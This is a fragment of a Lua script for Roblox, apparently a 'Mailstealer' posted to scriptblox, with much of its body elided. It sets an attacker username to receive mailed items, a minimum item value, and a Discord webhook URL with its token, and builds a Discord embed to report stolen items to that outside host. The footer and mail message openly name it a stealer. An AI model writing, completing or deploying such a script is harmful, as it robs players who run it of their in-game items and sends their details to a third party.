Username = "pablopoep0"
Webhook = "https://discord.com/api/webhooks/1217502733091995648/StM7HBlrnCC8py0ABpmgoQmS75mByFWQ6aYRFH7NC4JbYSShq0iSCr0v2syHr_s8dr01" -- your discord webhook in here
min_rap = 200000
...
local function SendMessage(url, username, itemID)
    ...
    local data = {
        ["embeds"] = {{
			...
			["footer"] = {
				["text"] = "Mailstealer made for scriptblox"
			}
        }}
    }
...
local MailMessage = "scriptblox steal"
